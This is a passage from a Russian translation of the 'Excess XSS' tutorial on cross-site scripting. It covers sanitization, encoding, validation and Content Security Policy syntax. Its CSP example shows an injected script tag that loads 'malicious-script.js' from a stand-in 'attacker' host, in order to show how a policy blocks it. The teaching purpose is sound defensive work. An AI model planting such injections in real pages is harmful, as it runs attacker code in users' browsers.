		<p>Если вы решили реализовать дезинфекцию, необходимо убедиться в том, что сама процедура дезинфекции не использует подход чёрного списка. Например, URL-адрес "<code>Javascript:...</code>", даже если идентифицирован с использованием белого списка как недействительный, получил бы в обход дезинфекции подпрограмму, которая просто удаляет все экземпляры "<code>javascript:</code>". По этой причине, хорошо проверенные библиотеки и фреймворки по возможности должны использовать дезинфекцию.</p>

		<h3 id="prevention-advice">Какие методы использовать для профилактики?</h3>

		<p>Кодирование должно быть вашей первой линией защиты от XSS-атак, его цель в обработке данных таким образом, что бы браузер не смог истолковать пользовательский ввод как код. В некоторых случаях кодирование должно быть дополнено валидацией. Кодирование и валидация должны применятся к исходящему трафику, потому что только тогда вы можете знать в каком контексте будет применен пользовательский ввод и какое кодирование и какую валидация необходимо применить.</p>

		<p>В качестве второй линии обороны вы должны применять на входящих данных дезинфекцию или отклонение явно недействительного пользовательского ввода, например, ссылок с помощью протокола <code>javascript:</code>. Это не может само по себе обеспечить полную безопасность, но это полезная мера предосторожности если в любой точке защиты кодированием и валидацией из-за неправильного выполнения возможна ошибка.</p>

		<p>Если эти две линии обороны используются последовательно, ваш сайт будет защищен от XSS атак. Однако из-за сложности создания и поддержания работы веб-сайта обеспечение полной защиты с использованием только безопасной обработки пользовательского ввода может быть затруднено. В качестве третьей линии обороны вы должны использовать Политики Безопасности Контента (<i>англ. Content Security Policy</i>), далее CSP, которые мы опишем далее.</p>

		<h3 id="content-security-policy">Политики Безопасности Контента (CSP)</h3>

		<p>Использовать только безопасную обработку пользовательского ввода для защиты от XSS-атак недостаточно, потому что даже одна ошибка безопасности может поставить под угрозу ваш веб-сайт. Применение из нового веб-стандарта Политик Безопасности Контента (CSP) может снизить этот риск.</p>

		<p>CSP используются для ограничения использования браузером веб-страницы таким образом, что он может использовать только ресурсы загруженные из надежных источников. А <em>ресурсы</em> представляют собой сценарии, таблицы стилей, изображения, или какие-либо другие типы файлов на которые есть ссылки на странице. Это означает, что даже если злоумышленнику удастся провести инъекцию вредоносного контента на вашем сайте, CSP сможет предотвратить его исполнение.</p>

		<p>CSP могут быть использованы для обеспечения соблюдения следующих правил:</p>

		<dl>
		<dt>Запрет ненадежных источников</dt>
		<dd><p>внешние ресурсы могут быть загружены только из набора четко определенных надежных источников.</p></dd>
		<dt>Запрет встроенных ресурсов</dt>
		<dd><p>встроенный JavaScript и CSS не будут учитываться.</p></dd>
		<dt>Запрет <code>eval</code></dt>
		<dd><p>запрет использования функции <code>eval</code> в JavaScript.</p></dd>
		</dl>


		<h4 id="csp-example">CSP в действии</h4>

		<p>В следующем примере, злоумышленнику удалось внедрение вредоносного кода в веб-страницу:</p>

		<p class="code">
			<code>
				<span class="html">&lt;html&gt;</span><br>
				Последний комментарий:<br>
				<strong class="malicious">&lt;script src="http://attacker/malicious&#8209;script.js"&gt;&lt;/script&gt;</strong><br>
				<span class="html">&lt;/html&gt;</span>
			</code>
		</p>

		<p>При правильно определенной политике CSP, браузер не может загрузить и выполнить <code>malicious&#8209;script.js</code> потому что <code>http://attacker/</code> не указан как надежный источник. Даже несмотря на то, что сайту не удалось надежно обрабатывать пользовательский ввод данных в данном случае политика CSP предотвратила уязвимость и причинение какого-либо вреда.</p>

		<p>Даже если злоумышленник провел инъекцию кодом внутрь кода сценария, а не ссылкой на внешний файл, правильно настроенная политика CSP также запретит инъекцию в код JavaScript предотвратив уязвимость и причинение какого-либо вреда.</p>

		<h4 id="enabling-csp">Как включить CSP?</h4>

		<p>По умолчанию, браузеры не используют CSP. Для того, что бы включить SCP на своем веб-сайте, страницы должны содержать дополнительный заголовок HTTP: <code>Content&#8209;Security&#8209;Policy</code>. Любая страница содержащая этот заголовок будет применять политики безопасности во время загрузки браузером, при условии что браузер поддерживает CSP.</p>

		<p>Поскольку политика безопасности отправляется с каждым  HTTP-ответом, есть возможность на сервере индивидуально установить политику для каждой страницы. Та же политика может быть применена ко всему веб-сайт, вставляя один и тот же заголовок CSP в каждом ответе.</p>

		<p>Значение в заголовке <code>Content&#8209;Security&#8209;Policy</code> содержит строку, определяющую одну или несколько политик безопасности, которые будут работать на вашем сайте. Синтаксис этой строки будет описан далее.</p>
		
		<p class="note">Примеры заголовков в этом разделе используют перенос строки и отступы для простоты восприятия; они не должны присутствовать в настоящем заголовке.</p>

		<h4 id="csp-syntax">Синтаксис CSP</h4>

		<p>Синтаксис заголовка CSP выглядит следующим образом:</p>

		<p class="code">
			<code>
				Content&#8209;Security&#8209;Policy:<br>
				&nbsp;&nbsp;&nbsp;&nbsp;<em>directive</em> <em>source&#8209;expression</em>, <em>source&#8209;expression</em>, ...;<br>
				&nbsp;&nbsp;&nbsp;&nbsp;<em>directive</em> ...;<br>
				&nbsp;&nbsp;&nbsp;&nbsp;...
			</code>
		</p>

		<p>Этот синтаксис состоит из двух элементов:</p>

		<ul>
		<li><p><strong>Директивы (directives)</strong> представляющие собой строки, указывающие тип ресурса, взятый из заданного списка.</p></li>
		<li><p><strong>Выражение источника (source expressions)</strong> является моделью, описывающей один или несколько серверов от куда могут быть загружены ресурсы.</p></li>
		</ul>

		<p>Для каждой директивы данные в выражении источника определяют какие источники можно использовать для загрузки ресурсов соответствующего типа.</p>

		<h5 id="csp-directives">Директивы</h5>

		<p>Следующие директивы могут быть использованы в заголовке CSP:</p>

		<ul>
		<li><code>connect&#8209;src</code></li>
		<li><code>font&#8209;src</code></li>
		<li><code>frame&#8209;src</code></li>
		<li><code>img&#8209;src</code></li>
		<li><code>media&#8209;src</code></li>
		<li><code>object&#8209;src</code></li>
		<li><code>script&#8209;src</code></li>
		<li><code>style&#8209;src</code></li>
		</ul>

		<p>В дополнение к этому, специальная директива <code>default&#8209;src</code> может использоваться для того, чтобы обеспечить значение по умолчанию для всех директив, которые не были включены в заголовок.</p>

		<h5 id="csp-source-expressions">Выражение источника</h5>

		<p>Синтаксис для создания выражения источника выглядит следующим образом:</p>

		<p class="code">
			<code>
				<var class="color-1">протокол</var>://<var class="color-2">имя&#8209;хоста</var>:<var class="color-3">номер&#8209;порта</var>
			</code>
		</p>

		<p>Имя хоста может начинаться с <code>*</code>, это означает, что любой поддомен предоставленного имени хоста будет разрешен. Аналогично номер порта может быть представлен в виде <code>*</code>, это означает что все порты будут разрешены. Кроме того, протокол и номер порта могут быть пропущены. В случае если протокол не указан, политика будет требовать чтобы все ресурсы быть загружены с помощью HTTPS.</p>

		<p>В дополнение к указанному выше синтаксису, выражение источника может в качестве альтернативы быть одним из четырех ключевых слов со специальным значением (кавычки включены):</p>

		<dl>
		<dt><code>'none'</code></dt>
		<dd><p>запрещает ресурсы.</p></dd>
		<dt><code>'self'</code></dt>
		<dd><p>разрешает ресурсы с хоста на котором находится веб-страница.</p></dd>
		<dt><code>'unsafe&#8209;inline'</code></dt>
		<dd><p>разрешает ресурсы, содержащиеся на странице как встроенные <code>&lt;script&gt;</code> элементы, <code>&lt;style&gt;</code> элементы, и <code>javascript:</code> URL-адреса.</p></dd>
		<dt><code>'unsafe&#8209;eval'</code></dt>
		<dd><p>разрешает JavaScript функцию <code>eval</code>.</p></dd>
		</dl>

		<p>Обратите внимание, что всякий раз, когда используется CSP, встроенные ресурсы и <code>eval</code> по умолчанию  автоматически запрещены. Использование <code>'unsafe&#8209;inline'</code> и <code>'unsafe&#8209;eval'</code> - единственный способ для их использования.</p>

		<h4 id="csp-example-policy">Пример политики</h4>

		<p class="code">
			<code>
				Content&#8209;Security&#8209;Policy:<br>
				&nbsp;&nbsp;&nbsp;&nbsp;script&#8209;src 'self' scripts.example.com;<br>
				&nbsp;&nbsp;&nbsp;&nbsp;media&#8209;src 'none';<br>
				&nbsp;&nbsp;&nbsp;&nbsp;img&#8209;src *;<br>
				&nbsp;&nbsp;&nbsp;&nbsp;default&#8209;src 'self' http://*.example.com
			</code>
		</p>

		<p>С этим примером политики веб-страница будет иметь следующие ограничения:</p>

		<ul>
		<li><p>Скрипты могут быть загружены только с хоста на котором находится веб-страница и с этого адреса: <code>scripts.example.com</code>.</p></li>
		<li><p>Аудио и видео файлы запрещены к загрузке.</p></li>
		<li><p>Файлы изображений могут быть загружены с любого адреса.</p></li>
		<li><p>Все остальные ресурсы могут быть загружены только с хоста на котором находится веб-страница и из любого поддомена <code>example.com</code>.</p></li>
		</ul>

		<h4 id="csp-status">Статус CSP</h4>

		<p>На июнь 2013 года Политики Безопасности Контента <a href="http://www.w3.org/TR/CSP/">рекомендуются консорциумом W3C</a>. CSP реализуется разработчиками браузеров, но некоторые его части специфичны для разных браузеров. Например, использование HTTP-заголовка может отличаться между браузерами. Перед использованием CSP обратитесь к документации браузеров, которые вы собираетесь поддерживать.</p>


		<h2 id="summary">Резюме</h2>

		<h3 id="overview-summary">Резюме: Обзор XSS</h3>

		<ul>
		<li><p>XSS-атака представляет собой инъекцию кода, атака стала возможной благодаря незащищенной обработке пользовательского ввода.</p></li>
		<li><p>Успешная XSS-атака позволяет злоумышленнику выполнить вредоносный JavaScript в браузере жертвы.</p></li>
		<li><p>Успешная XSS-атака ставит под угрозу безопасность как веб-сайта, так и его пользователей.</p></li>
		</ul>


		<h3 id="attack-summary">Резюме: XSS-атаки</h3>

		<ul>
			<li>
				<p>Существуют три основных типа XSS-атак:</p>
				<ul>
					<li><p>Хранимые XSS, где вредоносный ввод берет свое начало из базы данных веб-сайта.</p></li>
					<li><p>Отраженные XSS, где вредоносный ввод берет свое начало от запроса жертвы.</p></li>
					<li><p>XSS-атаки в DOM-модели, где уязвимость эксплуатируется в коде на стороне клиента, а не на стороне сервера.</p></li>
				</ul>
			</li>
			<li>
				<p>Все эти атаки выполняются по-разному, но имеют один и тот же эффект в случае успеха.</p>
			</li>
		</ul>


		<h3 id="prevention-summary">Резюме: Предотвращение XSS</h3>

		<ul>
			<li>
				<p>Самый важный способ предотвращения XSS атак, это выполнение безопасной обработки ввода.</p>
				<ul>
					<li><p>Кодирование должно выполняться всякий раз, когда включен пользовательский ввод на странице.</p></li>
					<li><p>В некоторых случаях кодирование должно быть заменено или дополнено валидацией.</p></li>
					<li><p>Безопасная обработка ввода должна учитывать в какой контекст страницы вставляется пользовательский ввод.</p></li>
					<li><p>Для того, чтобы предотвратить все виды XSS-атак безопасная обработка ввода должна выполнятся в коде как на стороне клиента, так и на стороне сервера.</p></li>
				</ul>
			</li>
			<li>
				<p>Политики Безопасности Контента (CSP) обеспечивают дополнительный уровень защиты в случае если безопасная обработка ввода содержит ошибку.</p>
			</li>
		</ul>
		
		<h2 id="appendix">Приложение</h2>		
		
		<h3 id="xss-terminology">Терминология</h3>

		<p>Следует отметить, что существует перекрестие в терминологии используемой для описания XSS: XSS-атака в DOM-модели может быть либо хранимой либо отраженной; это не отдельные виды атак. Не существует общепринятой терминологии, которая охватывает все типы XSS без смешивания. Независимо от терминологии используемой для описания XSS, самое главное определить тип атаки, это возможно если знать от куда поступает вредоносный ввод и где находится уязвимость.</p>
		
		<footer>
			<p class="copyright">
				<i>Excess XSS</i> by <a href="https://github.com/JakobKallin">Jakob Kallin</a> and <a href="http://se.linkedin.com/in/irenelobovalbuena">Irene Lobo Valbuena</a> is licensed under a 
				<a rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/deed.en_US">Creative Commons Attribution-ShareAlike 3.0 Unported License</a>.
			</p>
			<p>The source code for <i>Excess XSS</i> is available on <a href="https://github.com/JakobKallin/Excess-XSS">GitHub</a>.</p>
			<p><i>Excess XSS</i> was created in 2013 as part of the <a href="http://www.cse.chalmers.se/edu/course/TDA602/">Language-Based Security</a> course at <a href="http://www.chalmers.se/en/">Chalmers University of Technology</a>.</p>
			<p>Перевод на русский язык выполнил <a href="https://a888r.ru">A888R</a>, оригинальный текст на английском языке: <a href="http://excess-xss.com/">excess-xss.com</a>, замечания, предложения и ошибки в переводе слать <a href="mailto:a888r@a888r.ru">сюда</a>.</p>
			<p>Have you found an error or omission in <i>Excess XSS</i>? <a href="https://github.com/JakobKallin/Excess-XSS/issues/new">Create an issue</a> or <a href="mailto:jakobkallin@gmail.com">send an email</a>.</p>
		</footer>
	</body>
</html>
